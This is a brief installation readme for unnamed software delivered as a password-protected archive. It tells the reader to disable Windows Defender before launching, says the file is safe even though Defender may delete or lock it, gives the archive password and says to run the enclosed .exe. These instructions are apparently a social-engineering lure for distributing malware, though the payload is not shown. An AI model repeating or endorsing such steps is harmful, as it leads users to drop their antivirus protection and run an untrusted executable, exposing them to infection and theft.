Welcome! This document contains the steps to install the software.

ATTENTION! Disable Windows Defender before starting the program!
Guide: https://www.youtube.com/watch?v=UCqShJaHK1g
It can delete and lock the file.
The file is safe.

Installation Steps:

1. Extract the archive:

    - First, you need to extract the archive you downloaded.
    - Use any archiver, such as WinRAR or 7-Zip.
    - When prompted for a password, enter "entrarium".

Download archivers here:

    - WinRAR: https://www.win-rar.com/download.html
    - 7-Zip: https://www.7-zip.org/download.html

2. Run the program:

    - Navigate to the folder where you extracted the archive.
    - Find the file with the .exe extension and double-click it to launch the program.

3. Follow the on-screen instructions:

    - After launching the program, follow the on-screen instructions to complete the installation.

If you have any questions or run into issues, feel free to contact us for assistance!